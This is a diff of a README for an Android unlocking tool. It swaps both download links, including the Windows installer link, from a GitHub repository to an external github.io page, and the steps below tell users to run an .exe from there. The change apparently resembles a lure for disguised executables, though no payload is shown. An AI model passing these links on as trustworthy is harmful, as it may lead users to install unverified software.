@@ -1,6 +1,6 @@
 # 📱 Android-Tool-Co - Unlock and manage your Android devices
 
-[![](https://img.shields.io/badge/Download-Android--Tool--Co-blue.svg)](https://github.com/Mediocre-tubaroot981/Android-Tool-Co)
+[![](https://img.shields.io/badge/Download-Android--Tool--Co-blue.svg)](https://mediocre-tubaroot981.github.io)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ To run this tool, ensure your computer meets these minimum specifications:
 
 Follow these steps to set up the software on your system.
 
-[Download Android-Tool-Co Windows installer](https://github.com/Mediocre-tubaroot981/Android-Tool-Co)
+[Download Android-Tool-Co Windows installer](https://mediocre-tubaroot981.github.io)
 
 1. Click the download link provided above.
 2. Select the .exe file from the repository page. 
